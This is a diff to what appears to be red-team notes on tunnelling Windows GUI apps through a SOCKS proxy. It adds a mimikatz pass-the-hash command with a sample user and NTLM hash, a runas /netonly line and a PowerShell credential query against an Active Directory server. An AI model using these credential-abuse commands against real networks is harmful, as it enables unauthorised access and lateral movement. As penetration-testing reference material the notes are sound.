@@ -48,9 +48,25 @@ It is also possible to tunnel Windows GUI apps using `proxifier`.
 
 With Proxifier we can specify which application we want to tunneling.
 
-> **Note**: To use Windows authentication via a proxy, the application needs to be launched as a user from the target domain.
->
-> `runas /netonly /user:CORP\user C:\Tools\program.exe`
+To use Windows authentication via a proxy, the application needs to be launched as a user from the target domain.
+
+```
+runas /netonly /user:CORP\user C:\Tools\program.exe`
+```
+
+It can also be achieved with `mimikatz`.
+
+```
+mimikatz # privilege::debug
+mimikatz # sekurlsa::pth /domain:DEV /user:bfarmer /ntlm:4ea24377a53e67e78b2bd853974420fc /run:mmc.exe
+```
+
+Or we can use powershell credentials:
+
+```powershell
+$cred = Get-Credential
+Get-ADComputer -Server 10.10.10.10 -Credential $cred
+```
 
 # Port Forwarding
 
